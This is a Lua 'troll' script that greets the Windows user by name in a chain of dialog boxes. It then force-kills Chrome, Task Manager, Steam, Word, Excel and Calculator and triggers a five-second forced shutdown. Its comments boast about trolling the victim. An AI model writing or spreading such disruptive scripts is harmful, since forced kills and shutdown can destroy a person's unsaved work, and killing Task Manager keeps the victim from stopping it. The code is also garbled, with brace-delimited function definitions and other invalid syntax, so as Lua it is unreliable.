local ui = require "ui"

local user = print(os.getenv('USERNAME'));

--Functions

function add (CloseDistractions) {
  os.execute("taskkill /F /IM \"chrome.exe\" /T");  --Chrome

  os.execute("taskkill /F /IM \"taskmgr.exe\" /T");  --Task Manager

  os.execute("taskkill /F /IM \"steam.exe\" /T");  --Steam

  os.execute("taskkill /F /IM \"calc.exe\" /T");  --Calculator (LMFAO)

  os.execute("taskkill /F /IM \"winword.exe\" /T");  --MS Word

  os.execute("taskkill /F /IM \"excel.exe\" /T");  --MS Excel
}

function add (MakeDirReal) {
    Directory.make("C:\\Users\\"..os.getenv('USERNAME').."\\AppData\\Local\\ParaMattYT\\ShutDownLua")
    file = io.open("C:\\Users\\"..os.getenv('USERNAME').."\\AppData\\Local\\ParaMattYT\\ShutDownLua\\log.lualogger", "w")
    file:write("Successfully Trolled")
    file:close()
}

--here comes the garbage lmao

ui.info("Hey dude");

ui.info("Wait...");

ui.info("I think I know you!");

ui.info("Are you "..(os.getenv('USERNAME').."?");

ui.info("It is you!");

ui.info("Hey "..(os.getenv('USERNAME')..", what are you looking at over there?");

ui.info("Don\'t worry, I\'ll deal with that for you!");

CloseDistractions();

ui.info("Now that that\'s dealt with...");

ui.info("How\'s it going "..(os.getenv('USERNAME').."?");

ui.info("Good?");

ui.info("That\'s great!");

ui.info("I gotta go now");

ui.info("Bye "..(os.getenv('USERNAME').."!!!");

os.execute("shutdown /s /t 05"); --LMFAO

MakeDirReal();

--trolled, bitch.
